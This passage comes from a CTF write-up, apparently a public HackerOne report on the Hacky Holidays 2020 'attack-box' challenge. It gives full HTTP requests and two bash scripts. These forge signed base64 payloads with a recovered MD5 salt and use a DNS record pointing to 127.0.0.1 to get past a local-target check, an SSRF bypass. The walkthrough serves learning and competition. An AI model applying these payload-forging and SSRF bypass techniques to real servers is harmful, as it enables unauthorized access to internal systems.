Now we can launch an attack on any domain/IP, trying with `localtest.me` the attack was initially accepted, domain was DNS resolved to `127.0.0.1`, then aborted with message: `Local target detected, aborting attack`

```html
GET /attack-box/launch?payload=<@burp_urlencode_1><@base64_0>{"target":"localtest.me","hash":"<@md5_2>mrgrinch463localtest.me<@/md5_2>"}<@/base64_0><@/burp_urlencode_1> HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Referer: https://hackyholidays.h1ctf.com/attack-box/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Dec 2020 03:54:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /attack-box/launch/a66013f5b50198b1c2a5b496e18b4a8a
Content-Length: 0
```

```html
GET /attack-box/launch/a66013f5b50198b1c2a5b496e18b4a8a.json HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Referer: https://hackyholidays.h1ctf.com/attack-box/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Dec 2020 03:55:20 GMT
Content-Type: application/json
Connection: close
Content-Length: 297

[{"id":"20582","content":"Setting Target Information","goto":false},{"id":"20583","content":"Getting Host Information for: localtest.me","goto":false},{"id":"20584","content":"Host resolves to 127.0.0.1","goto":false},{"id":"20585","content":"Local target detected, aborting attack","goto":false}]
```

Besides inspecting `/attack-box/launch/a66013f5b50198b1c2a5b496e18b4a8a`, we know that we should expect a value other than `"goto":false`.

```html
GET /attack-box/launch/a66013f5b50198b1c2a5b496e18b4a8a HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Referer: https://hackyholidays.h1ctf.com/attack-box
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Dec 2020 23:55:54 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 2930

[...]
<script>
    var id = 0;
    function getData() {
        $.getJSON('/attack-box/launch/3172bbbb57e37b40fe36c44df6722142.json?id=' + id, function (resp) {
            $.each(resp, function (k, v) {
                $('div.response').append(v.content + '<br>')
                id = v.id;
                if( v.goto.length > 0 ){
                    window.location = v.goto;
                }
            });
        });
    }
    setInterval(function(){ getData(); }, 500);
</script>
[...]
```

Since we can only launch one attack every 15 seconds, and then we have to wait a few seconds to see the full attack response, I made a little bash script that will take care of that:

**launcher.sh**
```bash
#!/bin/bash
function pingpong(){
    hash=$(echo -n "mrgrinch463${1}"|md5sum|cut -d' ' -f1)
    payload=$(echo -n """{\"target\":\"$1\",\"hash\":\"${hash}\"}""" | base64)
    
    while :; do
        response=$(curl -ski "https://hackyholidays.h1ctf.com/attack-box/launch" -b "attackbox=d09d508e78f3975e0199a5e91dde9687" -G --data-urlencode "payload=${payload}")
        target=$(echo -n "${response}"|grep Location | grep -Po "[0-9a-f]{32}")

        test -n "${target}" && break
    done

    echo "target: $1 ,hash: $hash ,log: /launch/$target.json"
    while :; do
        sleep 1
        response=$(http "https://hackyholidays.h1ctf.com/attack-box/launch/${target}.json" "Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687" -b)
        goto=""
        echo "$response" | jq .[].goto | grep -v false && goto="true" && break
        echo "$response" | grep "maybe try again?" &>/dev/null && break
        echo "$response" | grep "aborting attack" &>/dev/null && break 
        echo "$response" | grep "Invalid IP or Hostname" &>/dev/null && break
    done 
    if [[ -z "$goto" ]]; then
        echo "$response"| jq -r .[-1].content
        false
    else
        echo "$response"| jq .
        true  
    fi
}
export -f pingpong

parallel -j1 -u --halt now,success=1 pingpong {} ::: $@
```

We tried variations for `localhost` as the target, without getting favorable results.

```bash
$ bash launcher.sh localhost localhost.me 127.0.0.{0..3}
target: localhost ,hash: 04ee8ef05337594457b6d58146cfeb2f ,log: /launch/a96b6cdacc3ae2608cae6a01f1c841d1.json
Local target detected, aborting attack
target: localhost.me ,hash: 384cd92bc9adeaa6d6355075c26f611e ,log: /launch/b67de3e0fd95c60210f1639d042309fd.json
Host still up, maybe try again?
target: 127.0.0.0 ,hash: 78871ec11f180ae11deb47517aa75367 ,log: /launch/65dc72069a1e62a9ab4dd5b191302db9.json
Host still up, maybe try again?
target: 127.0.0.1 ,hash: 3e3f8df1658372edf0214e202acb460b ,log: /launch/ee4dd2053c389873a1b6d3f7e4b8c126.json
Local target detected, aborting attack
target: 127.0.0.2 ,hash: 586ab97d543a78121ccc4d5d3f875d5d ,log: /launch/f299edf655cea098ed43a72a93a3d746.json
Host still up, maybe try again?
target: 127.0.0.3 ,hash: cf12d242b2729ac324653b31ae4ff8ad ,log: /launch/f5003ceb5a429b8a29b9885bc809e588.json
Host still up, maybe try again?
```

After taking a break, and sharing some ideas with other CTF participants led me to review other possible vectors related to [SSRF][ssrf] and DNS like [DNS Pinning][dnspin].

First I modified my script to launch the attack on a domain of my control 20 times:

**launcherV2.sh**
```bash
#!/bin/bash
function pingpong(){
    hash=$(echo -n "mrgrinch463${1}"|md5sum|cut -d' ' -f1)
    payload=$(echo -n """{\"target\":\"$1\",\"hash\":\"${hash}\"}""" | base64)
    
    while :; do
        response=$(curl -ski "https://hackyholidays.h1ctf.com/attack-box/launch" -b "attackbox=d09d508e78f3975e0199a5e91dde9687" -G --data-urlencode "payload=${payload}")
        target=$(echo -n "${response}"|grep Location | grep -Po "[0-9a-f]{32}")

        test -n "${target}" && break
    done

    echo "target: $1 ,hash: $hash ,log: /launch/$target.json"
    while :; do
        sleep 1
        response=$(http "https://hackyholidays.h1ctf.com/attack-box/launch/${target}.json" "Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687" -b)
        goto=""
        echo "$response" | jq .[].goto | grep -v false && goto="true" && break
        echo "$response" | grep "maybe try again?" &>/dev/null && break
        echo "$response" | grep "aborting attack" &>/dev/null && break 
        echo "$response" | grep "Invalid IP or Hostname" &>/dev/null && break
    done 
    if [[ -z "$goto" ]]; then
        echo "$response"| jq -r .[-1].content
        false
    else
        echo "$response"| jq .
        true  
    fi
}
export -f pingpong
parallel -j1 -u --halt now,success=1 $1 ::: {1..20}
```

We noticed that the attack was launched 20 times, but my domain has only received 5 DNS requests. So there is DNS caching involved on the server side.

```bash
$ bash launcherV2.sh ping.dns.████████
target: ping.dns.██████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: /launch/dd36da51cec410d35e3f93a58870080f.json
Host still up, maybe try again?
target: ping.dns.██████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: /launch/a2180dcbbd0b040bf61135cfa98ecd16.json
Host still up, maybe try again?
target: ping.dns.█████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: /launch/3a623deb8d5d1ebf4552fce49384d301.json
Host still up, maybe try again?
target: ping.dns.██████████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: /launch/d7a6a59a8614094c6cff4bd156990981.json
Host still up, maybe try again?
target: ping.dns.████████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: /launch/116f37f3d37a57feaaedbf45e81f9e09.json
Host still up, maybe try again?
<..>
target: ping.dns.████ ,hash: b186a57b69e753ff80519ca10d3df34e ,log: /launch/660524f8f7a4bb2423680db6221d4674.json
Host still up, maybe try again?
```

So I set a new DNS record set on my domain with the following response:

- DNS name: test.███
- Type: A
- Data:
    - 192.168.0.1
    - 127.0.0.1

After running our script a couple of times, we managed to complete the attack on the Grinch's servers.

```bash
$ bash launcherV2.sh test.█████
<..>

$ bash launcherV2.sh test.██████
target: test.███████ ,hash: 37ee8aa38e5068d77895c468eeb91d71 ,log: /launch/727e7428aa0d6d8f5346fb691c15c6c1.json
"/attack-box/challenge-completed-a3c589ba2709"
[
  {
    "id": "46547",
    "content": "Setting Target Information",
    "goto": false
  },
  {
    "id": "46548",
    "content": "Getting Host Information for: test.█████",
    "goto": false
  },
  {
    "id": "46549",
    "content": "Host resolves to 192.168.0.1",
    "goto": false
  },
  {
    "id": "46550",
    "content": "Spinning up botnet",
    "goto": false
  },
  {
    "id": "46551",
    "content": "Launching attack against: test.████ / 127.0.0.1",
    "goto": false
  },
  {
    "id": "46552",
    "content": "No Response from attack server, retrying...",
    "goto": false
  },
  {
    "id": "46553",
    "content": "No Response from attack server, retrying...",
    "goto": false
  },
  {
    "id": "46554",
    "content": "No Response from attack server, retrying...",
    "goto": "/attack-box/challenge-completed-a3c589ba2709"
  }
]
<..>
```

We finally got our last flag on `/attack-box/challenge-completed-a3c589ba2709`.

```html
GET /attack-box/challenge-completed-a3c589ba2709 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Referer: https://hackyholidays.h1ctf.com/attack-box/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Dec 2020 19:07:20 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1416

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Grinch Network Down!</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="/assets/css/apps.css">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks-outro-image.png" alt="Grinch Networks"></div>
    <div class="alert alert-success text-center">
        <p>Well done! You've taken down Grinch Networks and saved the holidays!</p>
        <p><strong>flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}</strong></p>
        <p>Thanks for playing, we'd appreciate it if you could leave us some <a href="https://discordapp.com/channels/514337135491416065/787419201148813393/791414871438000138">feedback here</a></p>
    </div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
</body>
</html>
```

{F1138034}


> flag: **flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}**

# Final thoughts

This was the first time that I have reached the end of a CTF challenge on this platform. I would like to thank the organizers for making this possible, thank you [@Hacker0x01][Hacker0x01], [@nahamsec][NahamSec], [@adamtlangley][adamtlangley].

I think it would not have been possible for me without the opportunity to share ideas when I needed a little nudge, I have not forgotten you guys, shout-outs to: [@ahzsec][ahzsec], [@MrKn0w1t4ll][MrKn0w1t4ll], @limerence.

Collaboration has been key! It has been an incredible challenge, I have learned a lot and I am looking forward to participating in future challenges.

Hacky Holidays!

[Hacker0x01]: https://twitter.com/Hacker0x01
[NahamSec]: https://twitter.com/NahamSec
[adamtlangley]: https://twitter.com/adamtlangley
[ahzsec]: https://twitter.com/ahzsec
[MrKn0w1t4ll]: https://twitter.com/MrKn0w1t4ll

# Tools
- Web proxy: [Burp Suite][burp]
- Burp Suite extension: [Hackvector][hackvector], [CSTC][cstc]
- Web fuzzer: [ffuf][ffuf]
- Password recovery utility: [fcrackzip][fcrackzip], [hashcat][hashcat]
- Hash tookup service: [Hashes.com][hashes.com]
- SQLi Tool: [SQLmap][sqlmap]
- PHP interactive shell: [phpsh][phpsh]

[burp]: https://portswigger.net/burp
[hackvector]: https://github.com/hackvertor/hackvertor
[ffuf]: https://github.com/ffuf/ffuf
[hashes.com]: https://hashes.com/en/decrypt/hash
[fcrackzip]: https://github.com/hyc/fcrackzip
[sqlmap]: https://github.com/sqlmapproject/sqlmap
[phpsh]: https://github.com/facebookarchive/phpsh
[cstc]: https://github.com/usdAG/cstc
[hashcat]: https://github.com/hashcat/hashcat

# Wordlists
- Web content: [common.txt][common.txt]
- Web parameters: [burp-parameter-names.txt][parameters.txt]
- API objects: [objects.txt][objects.txt]
- Common names: [names.txt][names.txt]
- Common passwords: [10-million-password-list-top-100.txt][10-million-password-list-top-100.txt]
- Everything else: [rockyou.txt][rockyou.txt]

[common.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
[parameters.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
[objects.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/objects.txt
[rockyou.txt]: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
[names.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt
[10-million-password-list-top-100.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt

# References

- https://www.codebyamir.com/blog/view-source-vs-inspect-element 
- https://www.php.net/manual/es/function.preg-replace.php
- https://www.php.net/manual/es/function.str-replace.php
- https://www.php.net/manual/es/function.is-numeric.php
- https://www.php.net/manual/es/function.intval.php
- https://portswigger.net/web-security/information-disclosure/exploiting
- https://portswigger.net/web-security/access-control/idor
- https://portswigger.net/web-security/authentication/password-based
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/ssrf
- https://github.com/0xn3va/cheat-sheets/tree/master/Web%20Application/Server%20Side%20Request%20Forgery
- https://www.thesslstore.com/blog/difference-encryption-hashing-salting/


[1]: https://twitter.com/Hacker0x01/status/1337136927720361984?s=20 "CTF announcement"
[2]: https://hackerone.com/h1-ctf?type=team
[3]: https://www.codebyamir.com/blog/view-source-vs-inspect-element 
[8]: https://www.php.net/manual/es/function.preg-replace.php
[9]: https://www.php.net/manual/es/function.str-replace.php
[12]: https://github.com/sqlmapproject/sqlmap/wiki/Usage
[13]: https://www.php.net/manual/es/function.is-numeric.php
[14]: https://www.php.net/manual/es/function.intval.php

[disclosure]: https://portswigger.net/web-security/information-disclosure/exploiting#files-for-web-crawlers
[idor]: https://portswigger.net/web-security/access-control/idor
[userenum]: https://portswigger.net/web-security/authentication/password-based
[sqli]: https://portswigger.net/web-security/sql-injection
[ssrf]: https://portswigger.net/web-security/ssrf
[dnspin]: https://github.com/0xn3va/cheat-sheets/tree/master/Web%20Application/Server%20Side%20Request%20Forgery
[salt]: https://www.thesslstore.com/blog/difference-encryption-hashing-salting/
- **Report Resolved**
- **2021-01-11** @rykkard: Yikes!, I've been told there are hackers around here, so could you redact those VPS references please: `█████`
- **2021-01-11** @nahamsec: Hey @rykkard - let me know if this is good.
- **2021-01-11** @rykkard: nicely done, thanks @nahamsec!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
